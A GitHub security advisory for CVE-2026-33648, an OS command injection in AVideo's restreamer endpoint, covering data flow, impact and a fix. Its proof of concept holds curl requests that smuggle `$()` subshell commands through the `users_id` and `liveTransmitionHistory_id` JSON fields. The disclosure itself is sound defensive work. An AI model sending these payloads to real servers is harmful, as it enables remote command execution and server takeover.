# [H] AVideo Vulnerable to OS Command Injection via Unsanitized `users_id` and `liveTransmitionHistory_id` in Restreamer Log File Path

## Summary
Severity: High
Advisory: GHSA-5m4q-5cvx-36mw
CVE: CVE-2026-33648
CWE: CWE-78
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-03-25
Source: https://github.com/advisories/GHSA-5m4q-5cvx-36mw
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

The restreamer endpoint constructs a log file path by embedding user-controlled `users_id` and `liveTransmitionHistory_id` values from the JSON request body without any sanitization. This log file path is then concatenated directly into shell commands passed to `exec()`, allowing an authenticated user to achieve arbitrary command execution on the server via shell metacharacters such as `$()` or backticks.

## Details

The vulnerability exists in `plugin/Live/standAloneFiles/restreamer.json.php`. The data flow is:

**1. User input ingestion** (line 220):
```php
$request = file_get_contents("php://input");
$robj = json_decode($request);
```

**2. Log file template** (line 58):
```php
$logFile = $logFileLocation . "ffmpeg_restreamer_{users_id}_" . date("Y-m-d-h-i-s") . ".log";
```

**3. `users_id` injected without sanitization** (line 318):
```php
$obj->logFile = str_replace('{users_id}', $robj->users_id, $logFile);
```

**4. `liveTransmitionHistory_id` injected without sanitization** (line 407):
```php
$pid[] = startRestream($m3u8, [$value], str_replace(".log", "_{$key}_{$robj->liveTransmitionHistory_id}_{$host}.log", $logFile), $robj);
```

Note: `intval()` is applied to `liveTransmitionHistory_id` in the separate `getProcess()` function (line 805), but NOT in the `runRestream()` path that constructs the log file.

**5. Unsanitized log file path passed to `exec()`** (lines 720, 723):
```php
// Line 720 (remote ffmpeg path):
execFFMPEGAsyncOrRemote($command . ' > ' . $logFile . ' 2>&1 ', $keyword, '', $restreamStandAloneFFMPEG);

// Line 723 (direct execution fallback):
exec($command . ' > ' . $logFile . ' 2>&1 &');
```

The code sanitizes stream URLs via `clearCommandURL()` and uses `escapeshellarg()` for pgrep patterns elsewhere, but completely neglects the log file path — a classic oversight where one injection vector is hardened while an adjacent one is left open.

## PoC

**Prerequisites:** A valid AVideo account with live streaming permissions and a valid restream token.

**Step 1:** Obtain a valid live streaming token by starting a live stream through the AVideo interface, or by calling the live API.

**Step 2:** Send a crafted restream request with shell metacharacters in `users_id`:

```bash
curl -k -X POST "https://TARGET/plugin/Live/standAloneFiles/restreamer.json.php" \
  -H "Content-Type: application/json" \
  -d '{
    "token": "VALID_TOKEN",
    "m3u8": "https://example.com/stream.m3u8",
    "restreamsDestinations": ["rtmp://example.com/live/key"],
    "restreamsToken": ["VALID_TOKEN"],
    "users_id": "x$(id > /tmp/pwned)x",
    "liveTransmitionHistory_id": "1"
  }'
```

**Step 3:** The resulting exec call becomes:
```
ffmpeg ... > /var/www/tmp/ffmpeg_restreamer_x$(id > /tmp/pwned)x_2026-03-20-... .log 2>&1 &
```

The `$()` subshell executes `id > /tmp/pwned` before the redirection is processed.

**Step 4:** Verify command execution:
```bash
curl -k "https://TARGET/tmp/pwned"
# Expected: output of `id` command showing the web server user
```

The same vector works through `liveTransmitionHistory_id`:
```bash
curl -k -X POST "https://TARGET/plugin/Live/standAloneFiles/restreamer.json.php" \
  -H "Content-Type: application/json" \
  -d '{
    "token": "VALID_TOKEN",
    "m3u8": "https://example.com/stream.m3u8",
    "restreamsDestinations": ["rtmp://example.com/live/key"],
    "restreamsToken": ["VALID_TOKEN"],
    "users_id": "1",
    "liveTransmitionHistory_id": "1$(whoami > /tmp/pwned2)1"
  }'
```

## Impact

An authenticated user with restream permissions can execute arbitrary OS commands on the server with the privileges of the web server process. This allows:

- **Full server compromise**: Reading sensitive files (`/etc/passwd`, database credentials, `.env` files)
- **Data exfiltration**: Accessing the AVideo database and all user data
- **Lateral movement**: Using the compromised server as a pivot point
- **Service disruption**: Killing processes, modifying or deleting files
- **Persistent backdoor**: Installing web shells or cron jobs for ongoing access

The authentication requirement (PR:L) limits this to users who have been granted streaming access, but in many AVideo deployments user registration is open, making this effectively a low-barrier attack.

## Recommended Fix

Sanitize both `users_id` and `liveTransmitionHistory_id` immediately after input, and use `escapeshellarg()` on the log file path before shell execution.

**In `restreamer.json.php`, after line 220 (input decoding), add input sanitization:**

```php
$robj = json_decode($request);
// Sanitize fields that will be used in file paths and shell commands
if (isset($robj->users_id)) {
    $robj->users_id = preg_replace('/[^a-zA-Z0-9_-]/', '', $robj->users_id);
}
if (isset($robj->liveTransmitionHistory_id)) {
    $robj->liveTransmitionHistory_id = intval($robj->liveTransmitionHistory_id);
}
```

**At lines 720 and 723, use `escapeshellarg()` on the log file path:**

```php
// Line 720:
execFFMPEGAsyncOrRemote($command . ' > ' . escapeshellarg($logFile) . ' 2>&1 ', $keyword, '', $restreamStandAloneFFMPEG);

// Line 723:
exec($command . ' > ' . escapeshellarg($logFile) . ' 2>&1 &');
```

Both fixes should be applied — input sanitization as defense-in-depth, and `escapeshellarg()` as the direct mitigation at the point of shell execution.

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-5m4q-5cvx-36mw
- https://nvd.nist.gov/vuln/detail/CVE-2026-33648
- https://github.com/WWBN/AVideo/commit/99b865413172045fef6a98b5e9bfc7b24da11678
- https://github.com/WWBN/AVideo
